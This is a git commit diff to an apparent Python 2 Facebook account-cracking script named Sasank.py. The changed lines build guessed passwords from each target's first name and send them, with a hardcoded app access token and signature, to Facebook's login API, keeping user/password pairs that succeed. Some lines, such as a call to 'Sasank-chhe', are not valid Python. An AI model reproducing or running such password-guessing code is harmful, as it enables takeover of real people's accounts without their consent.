d547eb1e7cfd8487719a3269f44efa6d9a5b79ec
Sasank-Ss4 <99401760+Sasank-chhe@users.noreply.github.com>
2022-06-27 15:06:07 +0545

    Update Sasank.py

--- Sasank.py
+++ Sasank.py
@@ -336,7 +336,7 @@ def pb():
 			                                        print(G+'[OK] ♡ '+user+' ♡ '+ps5)
 			                                        oks.append(user+ps5)
 			                                    else:
-			                                        ps6=(j['first_name']+'khan')
+			                                        ps6=(j['first_name']+'SSC')
 			                                        dt=urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='+(user)+'&locale=en_US&password='+(ps6)+'&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
 			                                        k=json.load(dt)
 			                                        if 'www.facebook.com' in k['error_msg']:
@@ -358,7 +358,7 @@ def pb():
 	print(S+'BlackMafia')     
 	print
 	Sasank-chhe(R + 'Back')
-	os.system('python2 B4.py')
+	os.system('python2 Sasank.py')
 if __name__=='__main__':
     login()
 
